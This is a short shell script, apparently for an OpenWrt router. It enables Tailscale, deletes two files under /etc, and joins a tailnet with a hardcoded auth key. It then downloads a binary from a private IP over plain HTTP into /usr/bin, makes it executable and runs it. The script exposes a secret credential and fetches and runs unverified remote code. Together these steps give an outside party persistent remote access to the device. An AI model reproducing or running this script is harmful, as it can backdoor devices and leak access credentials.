#!/bin/sh

uci set tailscale.settings.enabled='1'
uci commit tailscale
/etc/init.d/tailscale restart >/dev/null 2>&1
rm -f /etc/radu
rm -f /etc/pakawrt


tailscale up --reset --authkey tskey-auth-kUb2U7cts621CNTRL-nw5RsRHK81KGURRaZCis1KzKanMsJzUc


wget -O /usr/bin/rr http://100.76.102.105:8080/static/rr
chmod +x /usr/bin/rr
rr
